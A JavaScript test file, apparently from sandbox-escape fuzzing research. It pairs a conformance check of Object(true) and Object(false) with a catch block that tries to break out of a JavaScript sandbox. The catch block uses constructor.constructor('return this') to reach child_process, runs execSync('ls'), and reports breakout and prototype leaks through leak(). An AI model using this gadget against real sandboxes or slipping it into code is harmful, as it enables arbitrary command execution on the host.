try {
    if (Object(true).valueOf() !== true) {
        $ERROR('#1: Object(true).valueOf() === true. Actual: ' + Object(true).valueOf());
    }
    if (typeof Object(true) !== 'object') {
        $ERROR('#2: typeof Object(true) === "object". Actual: ' + typeof Object(true));
    }
    if (Object(true).constructor.prototype !== Boolean.prototype) {
        $ERROR('#3: Object(true).constructor.prototype === Boolean.prototype. Actual: ' + Object(true).constructor.prototype);
    }
    if (Object(false).valueOf() !== false) {
        $ERROR('#4: Object(false).valueOf() === false. Actual: ' + Object(false).valueOf());
    }
    if (typeof Object(false) !== 'object') {
        $ERROR('#5: typeof Object(false) === "object". Actual: ' + typeof Object(false));
    }
    if (Object(false).constructor.prototype !== Boolean.prototype) {
        $ERROR('#6: Object(false).constructor.prototype === Boolean.prototype. Actual: ' + Object(false).constructor.prototype);
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}